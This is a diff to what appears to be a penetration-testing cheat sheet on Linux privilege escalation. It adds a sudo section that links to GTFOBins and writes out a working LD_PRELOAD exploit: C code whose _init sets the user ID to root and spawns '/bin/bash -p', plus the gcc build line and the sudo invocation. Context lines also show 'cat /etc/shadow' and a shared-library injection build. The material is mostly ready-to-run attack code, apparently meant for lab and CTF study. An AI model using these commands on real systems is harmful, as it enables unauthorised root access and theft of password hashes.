@@ -76,7 +76,33 @@ run post/multi/recon/local_exploit_suggester
 ```
 
 # Privilege-Escalation ✅📚
+## sudo ✅📚
+### Shell Escape Sequences ✡️
+```bash
+sudo -l
+```
+[Every-Tools-Shell-Escap](https://gtfobins.github.io/)
 
+### Environment Variables ✡️
+```bash
+If "env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH" existed
+# Run ldd against the any program file to see which shared libraries are used by the program.
+ldd /usr/sbin/apache2
+nano /tmp/preload.c ⬇️⬇️⬇️⬇️
+---------------------
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+---------------------
+gcc /tmp/preload.c -fPIC -shared -nostartfiles -o /tmp/preload.so 
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+```
 ## Weak File Permissions ✅
 ```bash
 cat /etc/shadow
@@ -154,7 +180,8 @@ void inject() {
         system("/bin/bash -p");
 }
 -------------------
-gcc -shared -fPIC -o /home/user/.config/libcalc.so /tmp/libcalc.c
+gcc /tmp/libcalc.c -shared -fPIC -o /home/user/.config/libcalc.so
+
 ```
 
 ### Environment Variables ✡️
